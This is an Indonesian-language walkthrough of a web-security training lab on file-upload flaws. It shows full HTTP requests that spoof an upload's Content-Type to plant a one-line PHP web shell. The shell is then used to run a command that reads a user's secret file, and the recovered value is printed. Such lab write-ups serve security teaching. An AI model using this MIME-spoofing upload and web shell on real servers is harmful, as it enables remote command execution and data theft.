<img width="936" height="277" alt="image" src="https://github.com/user-attachments/assets/3e9a882a-892a-42c9-b347-1f0316a36606" />

di lab ini kerentanan masih sama, namun ada perbedaan pada keamananannya. kali ini server mengecek apakah filenya berupa jpeg. jika selain jpeg maka akan ditolak. tapi ada kerentanan lain yaitu manipulasi MIME Type pada request http

```
POST /my-account/avatar HTTP/2
Host: 0a8a00e3049f245680fe4e000005003d.web-security-academy.net
Cookie: session=TK1h2PSOLErtfypKhp7xhGWKtWaKTJvR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary9f65238931c78ebe9c49d08ef3512f7c
Content-Length: 500
Origin: https://0a8a00e3049f245680fe4e000005003d.web-security-academy.net
Referer: https://0a8a00e3049f245680fe4e000005003d.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary9f65238931c78ebe9c49d08ef3512f7c
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['command']); ?>

------geckoformboundary9f65238931c78ebe9c49d08ef3512f7c
Content-Disposition: form-data; name="user"


wiener
------geckoformboundary9f65238931c78ebe9c49d08ef3512f7c

Content-Disposition: form-data; name="csrf"

EUAw255LDFNl1OXxixyhxc3aXExNYuAw
------geckoformboundary9f65238931c78ebe9c49d08ef3512f7c--
```

Jika dilihat pada bagian Content-Type: application/x-php masih berupa kode php. kita bisa ubah jadi image/jpeg kemudian cek respons

```
HTTP/2 200 OK
Date: Thu, 04 Dec 2025 11:04:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130



The file avatars/shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Dari sini sudah bisa jalankan command via url karena webshell sudah tertanam di server.

```
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/2
Host: 0a8a00e3049f245680fe4e000005003d.web-security-academy.net
Cookie: session=TK1h2PSOLErtfypKhp7xhGWKtWaKTJvR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Dari situ kita berhasil solve labnya dan dapatkan pasword dari user carlos

```
HTTP/2 200 OK
Date: Thu, 04 Dec 2025 11:11:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

fYYLuGHJYuzgYHXP2Br8BrBWT0KX9luq
```
